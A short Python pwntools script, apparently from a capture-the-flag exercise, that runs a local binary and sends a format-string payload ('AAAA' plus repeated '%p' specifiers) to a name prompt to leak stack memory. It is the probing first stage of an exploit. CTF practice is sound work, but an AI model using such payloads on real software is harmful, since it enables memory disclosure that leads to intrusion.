from pwn import *

context(os="linux", arch="i386", log_level="info")
io= process('./pwn')
io.recvuntil("your name:")
io.send(b"AAAA" + b"-%p"*20)
io.recvuntil("Hello,")
leak = io.recvuntil("your passwd:")
print(leak)
